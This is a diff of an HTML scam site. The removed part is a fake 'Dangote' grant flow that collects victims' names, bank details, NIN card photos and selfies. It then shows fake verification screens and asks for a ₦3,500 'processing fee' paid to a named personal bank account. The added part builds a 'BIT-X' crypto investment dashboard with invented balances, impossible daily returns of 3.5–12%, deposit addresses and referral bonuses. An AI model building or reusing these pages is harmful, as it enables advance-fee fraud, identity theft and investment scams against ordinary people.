+              <div class="stat-value" id="stat-balance">$5,240.00</div>
+              <div class="stat-change up">↑ 12.4% this month</div>
+              <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg></div>
             </div>
-            <form id="formStep1" class="space-y-4">
-                <input type="text" id="name" placeholder="Full Name (As on NIN)" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                <div class="grid grid-cols-2 gap-4">
-                    <input type="number" id="age" min="18" placeholder="Age" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                    <select id="state" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                        <option value="">State</option>
-                        <option value="Abia">Abia</option><option value="Adamawa">Adamawa</option><option value="Akwa Ibom">Akwa Ibom</option><option value="Anambra">Anambra</option><option value="Bauchi">Bauchi</option><option value="Bayelsa">Bayelsa</option><option value="Benue">Benue</option><option value="Borno">Borno</option><option value="Cross River">Cross River</option><option value="Delta">Delta</option><option value="Ebonyi">Ebonyi</option><option value="Edo">Edo</option><option value="Ekiti">Ekiti</option><option value="Enugu">Enugu</option><option value="Abuja">FCT - Abuja</option><option value="Gombe">Gombe</option><option value="Imo">Imo</option><option value="Jigawa">Jigawa</option><option value="Kaduna">Kaduna</option><option value="Kano">Kano</option><option value="Katsina">Katsina</option><option value="Kebbi">Kebbi</option><option value="Kogi">Kogi</option><option value="Kwara">Kwara</option><option value="Lagos">Lagos</option><option value="Nasarawa">Nasarawa</option><option value="Niger">Niger</option><option value="Ogun">Ogun</option><option value="Ondo">Ondo</option><option value="Osun">Osun</option><option value="Oyo">Oyo</option><option value="Plateau">Plateau</option><option value="Rivers">Rivers</option><option value="Sokoto">Sokoto</option><option value="Taraba">Taraba</option><option value="Yobe">Yobe</option><option value="Zamfara">Zamfara</option>
-                    </select>
+            <div class="stat-card">
+              <div class="stat-label">Total ROI Earned</div>
+              <div class="stat-value" id="stat-roi">$840.00</div>
+              <div class="stat-change up">↑ 8.3% since last plan</div>
+              <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-label">Active Investment</div>
+              <div class="stat-value" id="stat-invested">$4,000.00</div>
+              <div class="stat-change up">Basic Plan — Active</div>
+              <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 00-4 0v2"/></svg></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-label">Pending Withdrawal</div>
+              <div class="stat-value">$0.00</div>
+              <div class="stat-change" style="color:var(--grey);">No pending requests</div>
+              <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/></svg></div>
+            </div>
+          </div>
+
+          <div class="three-col">
+            <div class="card">
+              <div class="section-header">
+                <div class="section-title">Portfolio Performance</div>
+                <div class="section-action">7 Days</div>
+              </div>
+              <div class="mini-chart" id="mini-chart"></div>
+              <div style="display:flex;justify-content:space-between;margin-top:20px;padding-top:16px;border-top:1px solid var(--grey-light);">
+                <div><div style="font-size:11px;color:var(--text-soft);margin-bottom:3px;">Deposited</div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:16px;">$4,000</div></div>
+                <div style="text-align:center;"><div style="font-size:11px;color:var(--text-soft);margin-bottom:3px;">Current</div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:16px;color:var(--blue);">$4,840</div></div>
+                <div style="text-align:right;"><div style="font-size:11px;color:var(--text-soft);margin-bottom:3px;">Profit</div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:16px;color:var(--success);">+$840</div></div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="section-header">
+                <div class="section-title">Recent Activity</div>
+                <div class="section-action" onclick="switchTab('history')">View All</div>
+              </div>
+              <div class="activity-list">
+                <div class="activity-item">
+                  <div class="activity-icon in">💰</div>
+                  <div class="activity-info"><div class="activity-title">BTC Deposit</div><div class="activity-time">2 hours ago</div></div>
+                  <div class="activity-amount up">+$500</div>
                 </div>
-                <select id="bank" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                    <option value="">Select Bank</option>
-                    <option value="OPay">OPay (Digital)</option>
-                    <option value="PalmPay">PalmPay (Digital)</option>
-                    <option value="Moniepoint">Moniepoint MFB</option>
-                    <option value="GTBank">Guaranty Trust Bank (GTB)</option>
-                    <option value="Access Bank">Access Bank</option>
-                    <option value="Zenith Bank">Zenith Bank</option>
-                    <option value="First Bank">First Bank of Nigeria</option>
-                    <option value="United Bank for Africa">United Bank for Africa (UBA)</option>
-                    <option value="Kuda Bank">Kuda Bank</option>
-                    <option value="Fidelity Bank">Fidelity Bank</option>
-                    <option value="Union Bank">Union Bank</option>
-                    <option value="Stanbic IBTC">Stanbic IBTC Bank</option>
-                    <option value="Sterling Bank">Sterling Bank</option>
-                    <option value="Wema Bank">Wema Bank</option>
-                    <option value="First City Monument Bank">First City Monument Bank (FCMB)</option>
-                    <option value="Polaris Bank">Polaris Bank</option>
-                    <option value="Keystone Bank">Keystone Bank</option>
-                    <option value="Standard Chartered">Standard Chartered Bank</option>
-                    <option value="Ecobank">Ecobank Nigeria</option>
-                    <option value="Heritage Bank">Heritage Bank</option>
-                    <option value="Unity Bank">Unity Bank</option>
-                    <option value="Jaiz Bank">Jaiz Bank</option>
-                    <option value="Taj Bank">Taj Bank</option>
-                    <option value="Lotus Bank">Lotus Bank</option>
-                    <option value="Providus Bank">Providus Bank</option>
-                    <option value="SunTrust Bank">SunTrust Bank</option>
-                    <option value="VFD Microfinance Bank">VFD Microfinance Bank</option>
-                    <option value="FairMoney Microfinance Bank">FairMoney Bank</option>
-                    <option value="Carbon">Carbon (Paylater)</option>
-                    <option value="Globus Bank">Globus Bank</option>
-                    <option value="PremiumTrust Bank">PremiumTrust Bank</option>
-                    <option value="Titan Trust Bank">Titan Trust Bank</option>
-                </select>
-                <input type="text" id="acc_name" placeholder="Account Name" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                <input type="number" id="acc_num" placeholder="Account Number" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
-                <button type="submit" class="w-full bg-dangote text-white py-5 rounded-xl font-bold uppercase tracking-widest">Continue</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- PAGE 3: INITIAL LOADER (10s) -->
-    <div id="loaderScreen" class="page-container flex-center bg-white">
-        <div class="text-center">
-            <div class="loader mx-auto mb-6"></div>
-            <h2 class="text-2xl font-bold text-dangote mb-2">Verifying Bank Data...</h2>
-            <p class="text-gray-400 text-sm animate-pulse">Connecting to CBN payment gateway...</p>
-        </div>
-    </div>
-
-    <!-- PAGE 4: UPLOAD -->
-    <div id="step2" class="page-container flex-center bg-dangote">
-        <div class="card relative">
-            <button onclick="navigateTo('step1')" class="absolute top-4 left-6 text-gray-400 hover:text-dangote text-xs font-bold">← BACK</button>
-            <div class="mt-6 mb-6 text-center">
-                <h2 class="serif text-2xl text-dangote font-bold">Verify Identity</h2>
-                <p class="text-gray-400 text-xs font-bold mt-1 uppercase">Step 2: Gallery Upload</p>
+                <div class="activity-item">
+                  <div class="activity-icon roi">📈</div>
+                  <div class="activity-info"><div class="activity-title">ROI Credit</div><div class="activity-time">Yesterday</div></div>
+                  <div class="activity-amount up">+$120</div>
+                </div>
+                <div class="activity-item">
+                  <div class="activity-icon out">💸</div>
+                  <div class="activity-info"><div class="activity-title">USDT Withdrawal</div><div class="activity-time">3 days ago</div></div>
+                  <div class="activity-amount down">-$200</div>
+                </div>
+                <div class="activity-item">
+                  <div class="activity-icon in">💰</div>
+                  <div class="activity-info"><div class="activity-title">ETH Deposit</div><div class="activity-time">1 week ago</div></div>
+                  <div class="activity-amount up">+$1,000</div>
+                </div>
+              </div>
             </div>
-            <form id="formStep2" class="space-y-6">
-                <div>
-                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">NIN Card Photo (Gallery Only)</label>
-                    <input type="file" id="nin_file" accept="image/*" required class="w-full text-xs">
-                </div>
-                <div>
-                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">Portrait Photo (Gallery Only)</label>
-                    <input type="file" id="selfie_file" accept="image/*" required class="w-full text-xs">
-                </div>
-                <button type="submit" id="finalBtn" class="w-full bg-yellow-500 text-dangote py-5 rounded-xl font-black uppercase tracking-widest shadow-xl">Complete Upload</button>
-            </form>
-        </div>
-    </div>
+          </div>
 
-    <!-- PAGE 5: POST-UPLOAD VERIFICATION (10s) -->
-    <div id="postUploadLoader" class="page-container flex-center bg-white">
-        <div class="text-center">
-            <div class="loader mx-auto mb-6"></div>
-            <h2 class="text-2xl font-bold text-dangote mb-2">Verifying Documents...</h2>
-            <p class="text-gray-400 text-sm animate-pulse">Running facial recognition and NIN cross-check...</p>
-        </div>
-    </div>
-
-    <!-- PAGE 6: NETWORK PROCESSING FEE -->
-    <div id="feePage" class="page-container flex-center bg-slate-900">
-        <div class="card text-center">
-            <div class="w-20 h-20 bg-blue-50 text-dangote rounded-full flex items-center justify-center mx-auto mb-6 text-3xl">⚙️</div>
-            <h2 class="serif text-3xl text-dangote font-bold mb-4">Grant Approved!</h2>
-            <p class="text-gray-600 mb-6 leading-relaxed">Your ₦75,000 grant has been provisionally approved. A <span class="font-bold text-dangote">Network Processing Fee</span> of <span class="font-bold text-red-600 underline">₦3,500</span> is required to activate the secure disbursement channel.</p>
-            <button onclick="navigateTo('transferPage')" class="w-full bg-dangote text-white py-5 rounded-xl font-bold uppercase tracking-widest shadow-lg">Proceed to Payment</button>
-        </div>
-    </div>
-
-    <!-- PAGE 7: TRANSFER DETAILS -->
-    <div id="transferPage" class="page-container flex-center bg-gray-100">
-        <div class="card">
-            <h2 class="serif text-2xl text-dangote font-bold mb-6 text-center">Bank Transfer</h2>
-            <p class="text-sm text-gray-500 mb-6 text-center">Please transfer the exact amount of <span class="font-bold text-black">₦3,500</span> to the account below:</p>
-            
-            <div class="bg-blue-50 p-6 rounded-2xl space-y-4 mb-8">
-                <div>
-                    <label class="text-[10px] text-gray-400 uppercase font-black">Bank Name</label>
-                    <div class="font-bold text-lg text-dangote">Moniepoint</div>
-                </div>
-                <div>
-                    <label class="text-[10px] text-gray-400 uppercase font-black">Account Number</label>
-                    <div class="font-bold text-2xl tracking-widest text-dangote">8065234821</div>
-                </div>
-                <div>
-                    <label class="text-[10px] text-gray-400 uppercase font-black">Account Name</label>
-                    <div class="font-bold text-lg text-dangote">Divine Adimonyemma</div>
-                </div>
+          <div class="card">
+            <div class="section-header">
+              <div class="section-title">My Active Plan</div>
+              <div class="section-action" onclick="switchTab('plans')">Upgrade Plan</div>
             </div>
-
-            <button onclick="navigateTo('successPage')" class="w-full bg-green-600 text-white py-5 rounded-xl font-bold uppercase tracking-widest shadow-lg">I Have Made the Transfer</button>
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:16px;">
+              <div style="background:var(--offwhite);border-radius:12px;padding:16px;">
+                <div style="font-size:11px;color:var(--text-soft);font-weight:600;text-transform:uppercase;margin-bottom:6px;">Plan</div>
+                <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:18px;color:var(--blue);">Basic</div>
+              </div>
+              <div style="background:var(--offwhite);border-radius:12px;padding:16px;">
+                <div style="font-size:11px;color:var(--text-soft);font-weight:600;text-transform:uppercase;margin-bottom:6px;">Daily ROI</div>
+                <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:18px;color:var(--navy);">3.5%</div>
+              </div>
+              <div style="background:var(--offwhite);border-radius:12px;padding:16px;">
+                <div style="font-size:11px;color:var(--text-soft);font-weight:600;text-transform:uppercase;margin-bottom:6px;">Duration</div>
+                <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:18px;color:var(--navy);">30 Days</div>
+              </div>
+              <div style="background:var(--offwhite);border-radius:12px;padding:16px;">
+                <div style="font-size:11px;color:var(--text-soft);font-weight:600;text-transform:uppercase;margin-bottom:6px;">Days Left</div>
+                <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:18px;color:var(--success);">22 Days</div>
+              </div>
+            </div>
+            <div style="margin-top:16px;background:var(--grey-light);border-radius:8px;height:8px;overflow:hidden;">
+              <div style="width:27%;height:100%;background:var(--blue);border-radius:8px;"></div>
+            </div>
+            <div style="font-size:12px;color:var(--text-soft);margin-top:6px;">8 of 30 days completed</div>
+          </div>
         </div>
+
+        <!-- PLANS TAB -->
+        <div id="tab-plans" style="display:none;" class="fade-in">
+          <div style="margin-bottom:24px;">
+            <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:22px;color:var(--navy);margin-bottom:6px;">Investment Plans</div>
+            <div style="font-size:14px;color:var(--text-soft);">Choose a plan that matches your investment goals. All plans include crypto payouts.</div>
+          </div>
+          <div class="plans-grid">
+            <div class="plan-card" onclick="openInvestModal('Basic','3.5','100','2,000','30')">
+              <div class="plan-name">Basic</div>
+              <div class="plan-roi">3.5%<span> / day</span></div>
+              <div class="plan-min">Min: $100 — Max: $2,000</div>
+              <ul class="plan-features">
+                <li>30-day duration</li>
+                <li>BTC, ETH, USDT</li>
+                <li>Daily ROI payout</li>
+                <li>Email support</li>
+              </ul>
+              <button class="btn-plan">Invest Now</button>
+            </div>
+            <div class="plan-card popular" onclick="openInvestModal('Advanced','5.0','2,001','10,000','45')">
+              <div class="plan-badge">Popular</div>
+              <div class="plan-name">Advanced</div>
+              <div class="plan-roi">5.0%<span> / day</span></div>
+              <div class="plan-min">Min: $2,001 — Max: $10,000</div>
+              <ul class="plan-features">
+                <li>45-day duration</li>
+                <li>BTC, ETH, USDT</li>
+                <li>Daily ROI payout</li>
+                <li>Priority support</li>
+              </ul>
+              <button class="btn-plan">Invest Now</button>
+            </div>
+            <div class="plan-card" onclick="openInvestModal('Premium','7.5','10,001','50,000','60')">
+              <div class="plan-name">Premium</div>
+              <div class="plan-roi">7.5%<span> / day</span></div>
+              <div class="plan-min">Min: $10,001 — Max: $50,000</div>
+              <ul class="plan-features">
+                <li>60-day duration</li>
+                <li>BTC, ETH, USDT</li>
+                <li>Daily ROI payout</li>
+                <li>Dedicated manager</li>
+              </ul>
+              <button class="btn-plan">Invest Now</button>
+            </div>
+            <div class="plan-card" onclick="openInvestModal('Elite','12.0','50,001','Unlimited','90')">
+              <div class="plan-name" style="color:var(--gold);">Elite 👑</div>
+              <div class="plan-roi" style="color:var(--gold);">12.0%<span style="color:var(--text-soft);"> / day</span></div>
+              <div class="plan-min">Min: $50,001 — Unlimited</div>
+              <ul class="plan-features">
+                <li>90-day duration</li>
+                <li>BTC, ETH, USDT</li>
+                <li>Daily ROI payout</li>
+                <li>VIP concierge</li>
+              </ul>
+              <button class="btn-plan" style="border-color:var(--gold);color:var(--gold);">Invest Now</button>
+            </div>
+          </div>
+          <div class="card" style="background:var(--navy);color:#fff;">
+            <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;">
+              <div>
+                <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:18px;margin-bottom:4px;">🔒 All investments are secured</div>
+                <div style="font-size:13px;color:rgba(255,255,255,0.6);">Your funds are protected with multi-layer encryption and cold wallet storage. ROI is paid daily to your BIT-X wallet.</div>
+              </div>
+              <div style="display:flex;gap:24px;flex-shrink:0;">
+                <div style="text-align:center;"><div style="font-family:'Syne',sans-serif;font-weight:800;font-size:22px;color:#60A5FA;">2,400+</div><div style="font-size:11px;color:rgba(255,255,255,0.5);">Active Investors</div></div>
+                <div style="text-align:center;"><div style="font-family:'Syne',sans-serif;font-weight:800;font-size:22px;color:#60A5FA;">$12M+</div><div style="font-size:11px;color:rgba(255,255,255,0.5);">Total Invested</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CALCULATOR TAB -->
+        <div id="tab-calculator" style="display:none;" class="fade-in">
+          <div style="margin-bottom:24px;">
+            <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:22px;color:var(--navy);margin-bottom:6px;">ROI Calculator</div>
+            <div style="font-size:14px;color:var(--text-soft);">Estimate your returns before you invest.</div>
+          </div>
+          <div class="card">
+            <div class="calc-wrap">
+              <div>
+                <div class="form-group">
+                  <label>Investment Plan</label>
+                  <select id="calc-plan" onchange="calcROI()">
+                    <option value="3.5,30">Basic — 3.5% / day — 30 days</option>
+                    <option value="5.0,45">Advanced — 5.0% / day — 45 days</option>
+                    <option value="7.5,60">Premium — 7.5% / day — 60 days</option>
+                    <option value="12.0,90">Elite — 12.0% / day — 90 days</option>
+                  </select>
+                </div>
+                <div class="form-group">
+                  <label>Investment Amount (USD): <strong id="calc-amount-display">$1,000</strong></label>
+                  <input type="range" class="range-input" id="calc-amount" min="100" max="50000" value="1000" oninput="calcROI()"/>
+                </div>
+                <div class="form-group">
+                  <label>Crypto Currency</label>
+                  <select id="calc-crypto" onchange="calcROI()">
+                    <option>Bitcoin (BTC)</option>
+                    <option>Ethereum (ETH)</option>
+                    <option>Tether (USDT)</option>
+                  </select>
+                </div>
+                <div style="background:var(--offwhite);border-radius:12px;padding:16px;margin-top:8px;">
+                  <div style="font-size:12px;color:var(--text-soft);margin-bottom:8px;font-weight:600;">⚡ QUICK FACTS</div>
+                  <div style="font-size:13px;color:var(--text-soft);display:flex;flex-direction:column;gap:5px;">
+                    <div>• ROI is credited daily to your wallet</div>
+                    <div>• No early withdrawal penalty after 7 days</div>
+                    <div>• Principal returned at plan end</div>
+                  </div>
+                </div>
+              </div>
+              <div class="calc-result-box">
+                <div class="calc-result-label">Total Profit</div>
+                <div class="calc-result-value" id="calc-profit">$1,050</div>
+                <div class="calc-result-total" id="calc-total-ret">Total return: $2,050</div>
+                <div class="calc-breakdown">
+                  <div class="calc-breakdown-item"><div class="label">Daily Profit</div><div class="val" id="calc-daily">$35</div></div>
+                  <div class="calc-breakdown-item"><div class="label">Duration</div><div class="val" id="calc-dur">30 days</div></div>
+                  <div class="calc-breakdown-item"><div class="label">ROI Rate</div><div class="val" id="calc-rate">3.5%</div></div>
+                  <div class="calc-breakdown-item"><div class="label">Total ROI</div><div class="val" id="calc-total-roi">105%</div></div>
+                </div>
+                <button class="btn-primary" style="margin-top:20px;border-radius:10px;" onclick="switchTab('plans')">Start Investing →</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DEPOSIT / WITHDRAW TAB -->
+        <div id="tab-deposit" style="display:none;" class="fade-in">
+          <div style="margin-bottom:24px;">
+            <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:22px;color:var(--navy);margin-bottom:6px;">Deposit & Withdraw</div>
+            <div style="font-size:14px;color:var(--text-soft);">Fund your account or withdraw your earnings.</div>
+          </div>
+          <div class="dw-tabs">
+            <div class="dw-tab active" onclick="switchDWTab('deposit')">💰 Deposit</div>
+            <div class="dw-tab" onclick="switchDWTab('withdraw')">💸 Withdraw</div>
+          </div>
+
+          <div id="dw-deposit-content">
+            <div class="two-col">
+              <div class="card">
+                <div class="section-title" style="margin-bottom:18px;">Select Crypto & Network</div>
+                <div class="form-group">
+                  <label>Cryptocurrency</label>
+                  <select id="dep-crypto" onchange="updateDepositAddress()">
+                    <option value="btc">Bitcoin (BTC)</option>
+                    <option value="eth">Ethereum (ETH)</option>
+                    <option value="usdt">Tether (USDT)</option>
+                  </select>
+                </div>
+                <div class="form-group">
+                  <label>Network</label>
+                  <select id="dep-network">
+                    <option>Bitcoin Network</option>
+                  </select>
+                </div>
+                <div style="background:#FEF3C7;border-radius:10px;padding:14px;margin-top:8px;">
+                  <div style="font-size:12px;font-weight:700;color:#92400E;margin-bottom:4px;">⚠ Important</div>
+                  <div style="font-size:12px;color:#92400E;">Only send the selected cryptocurrency to this address. Sending the wrong coin may result in permanent loss.</div>
+                </div>
+              </div>
+              <div class="card" style="text-align:center;">
+                <div class="section-title" style="margin-bottom:6px;" id="dep-title">BTC Deposit Address</div>
+                <div class="network-badge" id="dep-network-badge">Bitcoin Mainnet</div>
+                <div class="qr-placeholder">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="3" height="3"/><rect x="19" y="14" width="2" height="2"/><rect x="14" y="19" width="2" height="2"/><rect x="19" y="19" width="2" height="2"/></svg>
+                  QR Code
+                </div>
+                <div class="crypto-address">
+                  <span id="dep-address">1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf1</span>
+                  <button class="copy-btn" onclick="copyAddress()">Copy</button>
+                </div>
+                <div style="font-size:12px;color:var(--text-soft);margin-top:12px;">Min deposit: $50 • Credited after 2 confirmations</div>
+              </div>
+            </div>
+          </div>
+
+          <div id="dw-withdraw-content" style="display:none;">
+            <div class="two-col">
+              <div class="card">
+                <div class="section-title" style="margin-bottom:18px;">Withdrawal Request</div>
+                <div class="form-group">
+                  <label>Select Crypto</label>
+                  <select>
+                    <option>Bitcoin (BTC)</option>
+                    <option>Ethereum (ETH)</option>
+                    <option>Tether (USDT)</option>
+                  </select>
+                </div>
+                <div class="form-group">
+                  <label>Withdrawal Amount (USD)</label>
+                  <input type="number" placeholder="e.g. 500" min="50"/>
+                </div>
+                <div class="form-group">
+                  <label>Your Wallet Address</label>
+                  <input type="text" placeholder="Paste your wallet address here"/>
+                </div>
+                <div style="background:var(--offwhite);border-radius:10px;padding:14px;margin-bottom:16px;">
+                  <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px;"><span style="color:var(--text-soft);">Available Balance</span><span style="font-weight:700;color:var(--navy);">$5,240.00</span></div>
+                  <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px;"><span style="color:var(--text-soft);">Network Fee</span><span style="font-weight:700;color:var(--navy);">~$2.50</span></div>
+                  <div style="display:flex;justify-content:space-between;font-size:13px;border-top:1px solid var(--grey-light);padding-top:8px;margin-top:6px;"><span style="color:var(--text-soft);">Min Withdrawal</span><span style="font-weight:700;color:var(--navy);">$50</span></div>
+                </div>
+                <button class="btn-primary" onclick="submitWithdraw()">Submit Withdrawal Request</button>
+              </div>
+              <div class="card">
+                <div class="section-title" style="margin-bottom:18px;">Withdrawal Guidelines</div>
+                <div class="activity-list">
+                  <div class="activity-item"><div class="activity-icon roi">⏰</div><div class="activity-info"><div class="activity-title">Processing Time</div><div class="activity-time">1–3 business hours</div></div></div>
+                  <div class="activity-item"><div class="activity-icon in">✅</div><div class="activity-info"><div class="activity-title">KYC Required</div><div class="activity-time">For withdrawals over $1,000</div></div></div>
+                  <div class="activity-item"><div class="activity-icon out">🔒</div><div class="activity-info"><div class="activity-title">Security Hold</div><div class="activity-time">First withdrawal: 24-hr hold</div></div></div>
+                  <div class="activity-item"><div class="activity-icon roi">💱</div><div class="activity-info"><div class="activity-title">Conversion Rate</div><div class="activity-time">Live market rate at payout</div></div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- HISTORY TAB -->
+        <div id="tab-history" style="display:none;" class="fade-in">
+          <div style="margin-bottom:24px;">
+            <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:22px;color:var(--navy);margin-bottom:6px;">Transaction History</div>
+            <div style="font-size:14px;color:var(--text-soft);">All your deposits, withdrawals, and ROI credits.</div>
+          </div>
+          <div class="card">
+            <div style="display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;">
+              <select style="padding:9px 14px;border:1.5px solid var(--grey-light);border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;outline:none;">
+                <option>All Types</option>
+                <option>Deposit</option>
+                <option>Withdrawal</option>
+                <option>ROI Credit</option>
+              </select>
+              <select style="padding:9px 14px;border:1.5px solid var(--grey-light);border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;outline:none;">
+                <option>All Status</option>
+                <option>Completed</option>
+                <option>Pending</option>
+                <option>Failed</option>
+              </select>
+              <select style="padding:9px 14px;border:1.5px solid var(--grey-light);border-radius:8px;font-family:'DM Sans',sans-serif;font-size:13px;outline:none;">
+                <option>Last 30 Days</option>
+                <option>Last 7 Days</option>
+                <option>Last 90 Days</option>
+                <option>All Time</option>
+              </select>
+            </div>
+            <div class="table-wrap">
+              <table>
+                <thead>
+                  <tr>
+                    <th>Type</th><th>Amount</th><th>Crypto</th><th>Date</th><th>Status</th><th>Ref</th>
+                  </tr>
+                </thead>
+                <tbody id="tx-table-body"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- PROFILE TAB -->
+        <div id="tab-profile" style="display:none;" class="fade-in">
+          <div class="profile-header">
+            <div class="profile-avatar-lg" id="profile-avatar-lg">JD</div>
+            <div>
+              <div class="profile-name" id="profile-name-display">John Doe</div>
+              <div class="profile-email" id="profile-email-display">user@bitx.com</div>
+              <div class="verified-badge">✓ Verified Account</div>
+            </div>
+          </div>
+          <div class="two-col">
+            <div class="card">
+              <div class="section-title" style="margin-bottom:18px;">Personal Information</div>
+              <div class="form-group"><label>Full Name</label><input type="text" id="profile-name-input" value="John Doe"/></div>
+              <div class="form-group"><label>Email Address</label><input type="email" id="profile-email-input" value="user@bitx.com"/></div>
+              <div class="form-group"><label>Phone Number</label><input type="tel" placeholder="+1 (555) 000-0000"/></div>
+              <div class="form-group"><label>Country</label><select><option>United States</option><option>United Kingdom</option><option>Nigeria</option><option>Canada</option><option>Australia</option></select></div>
+              <button class="btn-primary" onclick="saveProfile()">Save Changes</button>
+            </div>
+            <div>
+              <div class="card" style="margin-bottom:20px;">
+                <div class="section-title" style="margin-bottom:18px;">Security</div>
+                <div class="form-group"><label>Current Password</label><input type="password" placeholder="••••••••"/></div>
+                <div class="form-group"><label>New Password</label><input type="password" placeholder="Min 8 characters"/></div>
+                <div class="form-group"><label>Confirm Password</label><input type="password" placeholder="Repeat new password"/></div>
+                <button class="btn-primary" style="background:var(--navy);" onclick="showToast('Password updated!','success')">Update Password</button>
+              </div>
+              <div class="card">
+                <div class="section-title" style="margin-bottom:14px;">My Referral Code</div>
+                <div class="crypto-address">
+                  <span>BX-USER-7A3F2</span>
+                  <button class="copy-btn" onclick="navigator.clipboard.writeText('BX-USER-7A3F2');showToast('Referral code copied!','success')">Copy</button>
+                </div>
+                <div style="font-size:12px;color:var(--text-soft);margin-top:10px;">Earn 5% bonus on every referral deposit</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /content-area -->
+    </div><!-- /main-content -->
+  </div>
+</div>
+
+<!-- ══════════════════════════════════ ADMIN DASHBOARD ══════════════════════════════════ -->
+<div id="page-admin" class="page">
+  <div class="overlay-bg" id="admin-sidebar-overlay" onclick="closeAdminSidebar()"></div>
+  <div class="app-layout">
+    <div class="sidebar" id="admin-sidebar">
+      <div class="sidebar-logo">
+        <div class="sidebar-logo-icon" style="background:#0B1437;font-size:12px;">⚙</div>
+        <div class="sidebar-logo-text">BIT<span>-X</span> Admin</div>
+      </div>
+      <div class="sidebar-nav">
+        <div class="nav-label">Overview</div>
+        <div class="nav-item active" onclick="switchAdminTab('overview')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
+          Overview
+        </div>
+        <div class="nav-item" onclick="switchAdminTab('users')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+          Users
+        </div>
+        <div class="nav-item" onclick="switchAdminTab('investments')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 100 7h5a3.5 3.5 0 110 7H6"/></svg>
+          Investments
+        </div>
+        <div class="nav-item" onclick="switchAdminTab('withdrawals')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/></svg>
+          Withdrawals
+        </div>
+      </div>
+      <div class="sidebar-user">
+        <div class="sidebar-avatar" style="background:linear-gradient(135deg,#1A2F6A,#0B1437);">AD</div>
+        <div class="sidebar-user-info">
+          <div class="sidebar-user-name">Admin</div>
+          <div class="sidebar-user-role">Super Admin</div>
+        </div>
+        <button class="logout-btn" onclick="doLogout()" title="Logout">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        </button>
+      </div>
     </div>
 
-    <!-- PAGE 8: SUCCESS PAGE -->
-    <div id="successPage" class="page-container flex-center bg-white">
-        <div class="card text-center border-t-8 border-green-500">
-            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl">✓</div>
